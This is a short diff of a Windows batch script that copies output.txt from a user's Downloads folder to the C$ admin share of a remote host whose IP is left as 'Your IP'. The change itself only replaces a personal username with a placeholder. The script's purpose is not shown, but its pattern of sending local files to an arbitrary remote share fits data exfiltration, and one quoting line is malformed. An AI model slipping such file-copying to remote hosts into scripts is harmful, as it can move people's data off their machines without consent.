@@ -12,6 +12,6 @@ echo COPIED DATA
 
 set "sourceFile=C:\Users\%FileLocation%\Downloads\output.txt"
 set "destinationIP="Your IP"
-set "destinationFolder=C$\Users\Joel\Desktop"
+set "destinationFolder=C$\Users\USERNAME\Desktop"
 
 copy "%sourceFile%" "\\%destinationIP%\%destinationFolder%"
